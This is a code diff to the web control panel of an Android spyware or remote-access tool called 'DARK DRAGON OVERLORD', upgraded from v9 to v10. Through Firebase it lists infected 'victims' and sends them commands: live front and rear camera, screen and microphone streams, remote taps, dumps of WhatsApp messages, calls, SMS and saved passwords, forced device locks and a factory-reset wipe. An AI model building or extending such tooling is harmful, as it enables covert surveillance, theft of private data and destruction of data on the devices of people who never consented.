@@ -2,16 +2,16 @@
 <html lang="si">
 <head>
     <meta charset="UTF-8">
-    <title>DARK DRAGON | OVERLORD v9.0</title>
+    <title>DARK DRAGON | OVERLORD v10.0 EXTREME</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        :root { --red: #ff0000; --cyan: #00ffff; --gold: #ffd700; --bg: #020000; --card: rgba(15, 0, 0, 0.95); }
+        :root { --red: #ff0000; --cyan: #00ffff; --gold: #ffd700; --bg: #020000; --card: rgba(15, 0, 0, 0.95); --green: #00ff00; }
         body { background: var(--bg); color: var(--red); font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
         #matrixCanvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.15; }
         
         #dashboard { display: none; height: 100vh; overflow-y: auto; }
-        .tabs { display: flex; background: #000; border-bottom: 2px solid var(--red); sticky: top; z-index: 1000; }
+        .tabs { display: flex; background: #000; border-bottom: 2px solid var(--red); position: sticky; top: 0; z-index: 1000; }
         .tab { padding: 15px 15px; cursor: pointer; font-size: 10px; border-right: 1px solid #200; color: #777; font-weight: bold; }
         .tab.active { background: var(--red); color: black; box-shadow: 0 0 10px var(--red); }
         
@@ -19,106 +19,116 @@
         .card { background: var(--card); border: 1px solid #300; padding: 15px; border-radius: 4px; }
         .card h3 { color: var(--cyan); font-size: 13px; border-bottom: 1px solid #222; padding-bottom: 5px; margin-top: 0; }
         
-        /* Stream Monitors */
+        /* Extreme Controls */
+        .status-on { color: var(--green); text-shadow: 0 0 5px var(--green); }
+        .status-off { color: var(--red); text-shadow: 0 0 5px var(--red); }
+        .action-btn { width: 100%; margin-top: 5px; padding: 10px; font-weight: bold; }
+        .lock-btn { border-color: var(--gold); color: var(--gold); }
+
         .monitor-view { width: 100%; height: 250px; background: #000; border: 1px solid #400; display: flex; align-items: center; justify-content: center; position: relative; }
         .monitor-view img { max-width: 100%; max-height: 100%; }
-        .status-tag { position: absolute; top: 5px; right: 5px; font-size: 9px; padding: 2px 5px; background: rgba(0,0,0,0.8); border: 1px solid; }
-
-        /* Vault */
         .vault-list { height: 180px; overflow-y: auto; background: #000; font-size: 10px; border: 1px solid #200; padding: 5px; }
-        .vault-item { padding: 8px; border-bottom: 1px solid #111; display: flex; justify-content: space-between; align-items: center; }
-
+        
         button { background: #110000; color: var(--red); border: 1px solid var(--red); padding: 8px; cursor: pointer; font-size: 10px; transition: 0.2s; }
         button:hover { background: var(--red); color: #000; }
-        .btn-dl { border-color: var(--gold); color: var(--gold); }
     </style>
 </head>
 <body>
 
 <canvas id="matrixCanvas"></canvas>
 
-<div id="login-box" style="position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); border:2px solid red; padding:50px; background:black; text-align:center;">
-    <h1 style="text-shadow: 0 0 10px red;">DRAGON OVERLORD</h1>
+<!-- LOGIN BOX (Original) -->
+<div id="login-box" style="position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); border:2px solid red; padding:50px; background:black; text-align:center; z-index: 2000;">
+    <h1 style="text-shadow: 0 0 10px red;">DRAGON OVERLORD v10</h1>
     <input type="password" id="master-code" placeholder="ENTER MASTER KEY" style="background:black; color:red; border:1px solid red; padding:15px; width: 250px; text-align:center;"><br><br>
     <button onclick="unlock()" style="width: 280px; padding: 15px;">INITIALIZE GOD MODE</button>
 </div>
 
 <div id="dashboard">
     <header style="padding:15px; border-bottom:1px solid red; display: flex; justify-content: space-between; align-items: center; background: #000;">
-        <span style="color: var(--gold); font-weight: bold;">[v9.0 SUPREME]</span>
+        <span style="color: var(--gold); font-weight: bold;">[v10.0 EXTREME]</span>
         <span style="color: var(--cyan);">TARGET: <b id="target-name-display">DISCONNECTED</b></span>
-        <div id="screen-status" style="font-size: 10px; color: #555;">SCREEN: UNKNOWN</div>
+        <div id="target-health" style="font-size: 10px;">BATT: --% | SIGNAL: -- | SCREEN: <span id="screen-status-text">OFF</span></div>
     </header>
 
     <div class="tabs">
         <div class="tab active" onclick="showTab('nodes')">👥 TARGETS</div>
-        <div class="tab" onclick="showTab('control')">🖱️ REMOTE DISPLAY</div>
-        <div class="tab" onclick="showTab('camera')">📷 LIVE CAMERA</div>
-        <div class="tab" onclick="showTab('vault')">📂 AUTO-VAULT</div>
-        <div class="tab" onclick="showTab('settings')">⚙️ OPTIONS</div>
+        <div class="tab" onclick="showTab('extreme')">⚡ EXTREME CONTROL</div>
+        <div class="tab" onclick="showTab('control')">📱 LIVE DISPLAY</div>
+        <div class="tab" onclick="showTab('camera')">📷 CAMERA</div>
+        <div class="tab" onclick="showTab('vault')">📂 VAULT</div>
     </div>
 
     <div class="container">
-        <div id="camera" class="panel" style="display:none; grid-column: 1/-1;">
-            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
-                <div class="card">
-                    <h3>📷 BACK CAMERA STREAM</h3>
-                    <div class="monitor-view"><img id="cam-back-img" src=""><div class="status-tag" style="color: lime; border-color: lime;">REAR</div></div>
-                    <button onclick="sendCmd('start_cam_back')" style="width: 100%;">ENABLE REAR CAM</button>
-                </div>
-                <div class="card">
-                    <h3>🤳 FRONT CAMERA STREAM</h3>
-                    <div class="monitor-view"><img id="cam-front-img" src=""><div class="status-tag" style="color: var(--cyan); border-color: var(--cyan);">FRONT</div></div>
-                    <button onclick="sendCmd('start_cam_front')" style="width: 100%;">ENABLE FRONT CAM</button>
-                </div>
-            </div>
-        </div>
-
-        <div id="control" class="panel" style="display:none; grid-column: 1/-1;">
-            <div style="display: flex; gap: 20px; justify-content: center;">
-                <div class="card">
-                    <h3 id="screen-label">📱 DEVICE DISPLAY (LIVE)</h3>
-                    <div style="width: 280px; height: 550px; border: 4px solid #333; border-radius: 15px; overflow: hidden; background: #000;">
-                        <img id="live-screen-img" src="" style="width: 100%; height: 100%;" onclick="handleScreenClick(event)">
-                    </div>
-                </div>
-                <div class="card" style="width: 300px;">
-                    <h3>⌨️ SYSTEM CONTROL</h3>
-                    <button style="width: 48%" onclick="sendCmd('key_back')">BACK</button>
-                    <button style="width: 48%" onclick="sendCmd('key_home')">HOME</button><br>
-                    <button style="width: 100%" onclick="sendCmd('key_recent')">RECENT APPS</button>
-                    <hr style="border: 0.5px solid #200;">
-                    <h3>📊 LIVE TELEMETRY</h3>
-                    <div id="batt-info">Battery: --%</div>
-                    <div id="net-info">Network: --</div>
-                    <div id="loc-info">Location: --</div>
-                </div>
-            </div>
-        </div>
-
-        <div id="vault" class="panel" style="display:none; grid-column: 1/-1;">
-            <div class="container" style="padding: 0;">
-                <div class="card">
-                    <h3>📞 CALLS & SMS (AUTO-SAVE)</h3>
-                    <div class="vault-list" id="call-vault">Ready to sync...</div>
-                </div>
-                <div class="card">
-                    <h3>🖼️ GALLERY & MEDIA</h3>
-                    <div class="vault-list" id="media-vault">No media detected...</div>
-                </div>
-                <div class="card">
-                    <h3>🔑 SAVED PASSWORDS & LOGS</h3>
-                    <div class="vault-list" id="pass-vault">Scanning for data...</div>
-                </div>
-            </div>
-        </div>
-
+        <!-- NODES PANEL (Original) -->
         <div id="nodes" class="panel">
             <div class="card" style="grid-column: 1/-1;">
                 <h3>📡 ACTIVE NODES</h3>
                 <table id="victim-table" style="width:100%; text-align:left; font-size:11px;">
                     <tr style="color: var(--cyan);"><th>NAME/ID</th><th>MODEL</th><th>IP</th><th>OS</th><th>ACTION</th></tr>
                 </table>
+            </div>
+        </div>
+
+        <!-- EXTREME CONTROL PANEL (New) -->
+        <div id="extreme" class="panel" style="display:none; grid-column: 1/-1;">
+            <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 20px;">
+                <div class="card">
+                    <h3>🛡️ GATEKEEPER (USER AUTH)</h3>
+                    <input type="text" id="new-user" placeholder="Create Username" style="width:100%; background:#000; color:lime; border:1px solid #333; margin-bottom:5px;">
+                    <input type="text" id="new-pass" placeholder="Create Password" style="width:100%; background:#000; color:lime; border:1px solid #333; margin-bottom:5px;">
+                    <button class="action-btn" onclick="createUser()">GENERATE ACCESS KEY</button>
+                    <hr border="0.5">
+                    <button class="action-btn" style="border-color:orange; color:orange;" onclick="sendCmd('revoke_access')">REVOKE ALL ACCESS</button>
+                </div>
+                <div class="card">
+                    <h3>🔒 THE GUARDIAN (DEVICE LOCK)</h3>
+                    <button class="action-btn lock-btn" onclick="sendCmd('lock_device')">FORCE LOCK DEVICE</button>
+                    <button class="action-btn" onclick="sendCmd('unlock_device')">RELEASE LOCK</button>
+                    <button class="action-btn" style="color:red; border-color:red;" onclick="sendCmd('wipe_data')">WIPE ALL DATA (FACTORY RESET)</button>
+                </div>
+                <div class="card">
+                    <h3>🎤 LIVE MIC & SPY</h3>
+                    <button class="action-btn" onclick="sendCmd('start_mic')">START LIVE MIC</button>
+                    <button class="action-btn" onclick="sendCmd('stop_mic')">STOP LIVE MIC</button>
+                    <button class="action-btn" onclick="sendCmd('get_whatsapp')">DUMP WHATSAPP MSGS</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- CAMERA PANEL (Original + Fix) -->
+        <div id="camera" class="panel" style="display:none; grid-column: 1/-1;">
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+                <div class="card">
+                    <h3>📷 BACK CAMERA</h3>
+                    <div class="monitor-view"><img id="cam-back-img" src=""></div>
+                    <button class="action-btn" onclick="sendCmd('start_cam_back')">ENABLE REAR CAM</button>
+                </div>
+                <div class="card">
+                    <h3>🤳 FRONT CAMERA</h3>
+                    <div class="monitor-view"><img id="cam-front-img" src=""></div>
+                    <button class="action-btn" onclick="sendCmd('start_cam_front')">ENABLE FRONT CAM</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- LIVE DISPLAY (Original) -->
+        <div id="control" class="panel" style="display:none; grid-column: 1/-1;">
+             <div style="display: flex; gap: 20px; justify-content: center;">
+                <div class="card">
+                    <h3>📱 DEVICE DISPLAY (LIVE)</h3>
+                    <div style="width: 280px; height: 500px; border: 4px solid #333; border-radius: 15px; overflow: hidden; background: #000;">
+                        <img id="live-screen-img" src="" style="width: 100%; height: 100%;" onclick="handleScreenClick(event)">
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- VAULT (Original) -->
+        <div id="vault" class="panel" style="display:none; grid-column: 1/-1;">
+            <div class="card">
+                <h3>📂 AUTOMATIC DATA VAULT</h3>
+                <div class="vault-list" id="media-vault">Scanning for Target Data...</div>
             </div>
         </div>
     </div>
@@ -159,60 +169,47 @@
         activeTarget = key;
         document.getElementById('target-name-display').innerText = name.toUpperCase();
         
-        // Listen Screen Status (ON/OFF)
-        db.ref('status/' + key + '/screen_on').on('value', snap => {
-            const status = snap.val() ? "ON" : "OFF";
-            document.getElementById('screen-status').innerText = "SCREEN: " + status;
-            document.getElementById('screen-status').style.color = snap.val() ? "lime" : "red";
+        // Listen for Battery & Status
+        db.ref('status/' + key).on('value', snap => {
+            if(snap.val()) {
+                const s = snap.val();
+                document.getElementById('target-health').innerHTML = `BATT: ${s.battery}% | SIGNAL: ${s.signal} | SCREEN: <span style="color:${s.screen_on ? 'lime':'red'}">${s.screen_on ? 'ON':'OFF'}</span>`;
+            }
         });
 
-        // Listen for Camera Feeds
+        // Sync Streams
         db.ref('streams/' + key + '/back').on('value', snap => { if(snap.val()) document.getElementById('cam-back-img').src = snap.val(); });
         db.ref('streams/' + key + '/front').on('value', snap => { if(snap.val()) document.getElementById('cam-front-img').src = snap.val(); });
-
-        // Listen for Screen Display
         db.ref('screens/' + key).on('value', snap => { if(snap.val()) document.getElementById('live-screen-img').src = snap.val().img; });
-
-        // Auto-Scrape & Show Downloads
-        syncVault(key);
     }
 
-    function syncVault(key) {
-        db.ref('vault/' + key + '/media').on('value', snap => {
-            let html = "";
-            snap.forEach(m => {
-                html += `<div class="vault-item">
-                    <span>${m.val().name}</span>
-                    <button class="btn-dl" onclick="downloadData('${m.val().url}', '${m.val().name}')">SAVE TO PC</button>
-                </div>`;
-            });
-            document.getElementById('media-vault').innerHTML = html;
-        });
-    }
+    // --- NEW EXTREME FEATURES ---
 
-    function downloadData(url, filename) {
-        const a = document.createElement('a');
-        a.href = url; a.download = filename;
-        document.body.appendChild(a); a.click(); document.body.removeChild(a);
-    }
-
-    function handleScreenClick(e) {
-        if(!activeTarget) return;
-        const rect = e.target.getBoundingClientRect();
-        const x = ((e.clientX - rect.left) / rect.width).toFixed(2);
-        const y = ((e.clientY - rect.top) / rect.height).toFixed(2);
-        db.ref('commands/' + activeTarget).set({ action: 'touch', x: x, y: y, time: Date.now() });
+    function createUser() {
+        const u = document.getElementById('new-user').value;
+        const p = document.getElementById('new-pass').value;
+        if(!u || !p) return alert("Enter Username & Password!");
+        
+        db.ref('auth_keys/' + u).set({
+            password: p,
+            status: 'active',
+            created: Date.now()
+        }).then(() => alert("GOD-KEY GENERATED SUCCESSFULLY!"));
     }
 
     function sendCmd(action) {
-        if(!activeTarget) return alert("SELECT TARGET!");
-        db.ref('commands/' + activeTarget).set({ action: action, time: Date.now() });
+        if(!activeTarget) return alert("SELECT A TARGET FIRST!");
+        db.ref('commands/' + activeTarget).set({ 
+            action: action, 
+            time: Date.now(),
+            admin: "Overlord_v10"
+        });
     }
 
     function showTab(id) {
         document.querySelectorAll('.panel').forEach(p => p.style.display = 'none');
         document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-        document.getElementById(id).style.display = 'grid';
+        document.getElementById(id).style.display = (id === 'nodes' ? 'block' : 'grid');
         event.currentTarget.classList.add('active');
     }
 
@@ -223,7 +220,7 @@
         const drops = Array(Math.floor(canvas.width/20)).fill(1);
         setInterval(() => {
             ctx.fillStyle = 'rgba(0,0,0,0.05)'; ctx.fillRect(0,0,canvas.width,canvas.height);
-            ctx.fillStyle = '#f00';
+            ctx.fillStyle = '#f00'; ctx.font = "15px Arial";
             drops.forEach((y, i) => {
                 ctx.fillText(String.fromCharCode(Math.random()*128), i*20, y*20);
                 if(y*20 > canvas.height && Math.random() > 0.975) drops[i] = 0;
